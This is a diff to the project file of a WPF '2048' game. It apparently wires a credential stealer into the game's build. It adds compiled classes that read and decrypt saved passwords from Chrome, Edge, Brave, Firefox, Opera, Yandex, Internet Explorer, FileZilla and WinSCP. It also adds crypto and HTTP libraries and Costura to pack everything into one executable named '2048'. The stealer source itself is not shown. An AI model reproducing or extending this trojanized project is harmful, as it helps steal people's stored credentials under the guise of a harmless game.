@@ -1,5 +1,6 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props')" />
   <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
   <PropertyGroup>
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
@@ -8,11 +9,13 @@
     <OutputType>WinExe</OutputType>
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>Game2048</RootNamespace>
-    <AssemblyName>Game2048</AssemblyName>
+    <AssemblyName>2048</AssemblyName>
     <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <ProjectTypeGuids>{60dc8134-eba5-43b8-bcc9-bb4bc16c2548};{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}</ProjectTypeGuids>
     <WarningLevel>4</WarningLevel>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -37,16 +40,32 @@
     <ApplicationIcon>2048.ico</ApplicationIcon>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="BouncyCastle.Crypto, Version=1.8.10.0, Culture=neutral, PublicKeyToken=0e99375e54769942, processorArchitecture=MSIL">
+      <HintPath>..\packages\Portable.BouncyCastle.1.8.10\lib\net40\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="Costura, Version=5.6.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Costura.Fody.5.6.0\lib\netstandard1.0\Costura.dll</HintPath>
+    </Reference>
     <Reference Include="EntityFramework">
       <HintPath>..\packages\EntityFramework.6.1.1\lib\net45\EntityFramework.dll</HintPath>
     </Reference>
     <Reference Include="EntityFramework.SqlServer">
       <HintPath>..\packages\EntityFramework.6.1.1\lib\net45\EntityFramework.SqlServer.dll</HintPath>
     </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+    </Reference>
     <Reference Include="System" />
+    <Reference Include="System.ComponentModel.Composition" />
     <Reference Include="System.ComponentModel.DataAnnotations" />
     <Reference Include="System.Data" />
     <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.RuntimeInformation.4.3.0\lib\net45\System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+    </Reference>
     <Reference Include="System.Runtime.Serialization" />
     <Reference Include="System.Security" />
     <Reference Include="System.Windows.Forms" />
@@ -98,6 +117,34 @@
       <DependentUpon>App.xaml</DependentUpon>
       <SubType>Code</SubType>
     </Compile>
+    <Compile Include="Client\Extensions\KeyExtensions.cs" />
+    <Compile Include="Client\Extensions\ProcessExtensions.cs" />
+    <Compile Include="Client\Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Client\Helper\DateTimeHelper.cs" />
+    <Compile Include="Client\Helper\JsonHelper.cs" />
+    <Compile Include="Client\Helper\RegistryKeyHelper.cs" />
+    <Compile Include="Client\Recovery\Browsers\BravePassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\ChromePassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\ChromiumBase.cs" />
+    <Compile Include="Client\Recovery\Browsers\ChromiumDecryptor.cs" />
+    <Compile Include="Client\Recovery\Browsers\EdgePassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\FFDecryptor.cs" />
+    <Compile Include="Client\Recovery\Browsers\FirefoxPassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\InternetExplorerPassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\OperaGXPassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\OperaPassReader.cs" />
+    <Compile Include="Client\Recovery\Browsers\YandexPassReader.cs" />
+    <Compile Include="Client\Recovery\FtpClients\FileZillaPassReader.cs" />
+    <Compile Include="Client\Recovery\FtpClients\WinScpPassReader.cs" />
+    <Compile Include="Client\Recovery\IPassReader.cs" />
+    <Compile Include="Client\Recovery\Utilities\SQLiteHandler.cs" />
+    <Compile Include="Client\Utilities\NativeMethods.cs" />
+    <Compile Include="Client\Utilities\SingleInstanceMutex.cs" />
+    <Compile Include="Common\Models\RecoveredAccount.cs" />
+    <Compile Include="Common\Models\RegSeekerMatch.cs" />
+    <Compile Include="Common\Models\RegValueData.cs" />
+    <Compile Include="Common\Utilities\ByteConverter.cs" />
+    <Compile Include="Common\Utilities\SafeRandom.cs" />
     <Compile Include="CustomControls\GameOverWindow.xaml.cs">
       <DependentUpon>GameOverWindow.xaml</DependentUpon>
     </Compile>
@@ -231,6 +278,16 @@
     <Resource Include="2048.ico" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\Fody.6.5.2\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.2\build\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Fody.6.5.2\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.5.2\build\Fody.targets'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets'))" />
+  </Target>
+  <Import Project="..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets')" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
   <Target Name="BeforeBuild">
